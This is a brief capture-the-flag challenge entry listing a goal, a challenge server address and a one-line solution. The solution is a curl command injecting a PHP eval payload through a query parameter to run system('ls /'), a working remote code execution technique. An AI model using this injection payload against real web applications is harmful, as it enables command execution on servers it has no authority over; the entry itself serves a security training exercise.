#### Goals
 * Try to find the flag

#### Server Address
 * http://web.sniperoj.com:10001/

#### Solution
```
curl "http://localhost/?str=${eval($_REQUEST[c])}&c=system('ls /');"
```

#### Writeups
 * TODO

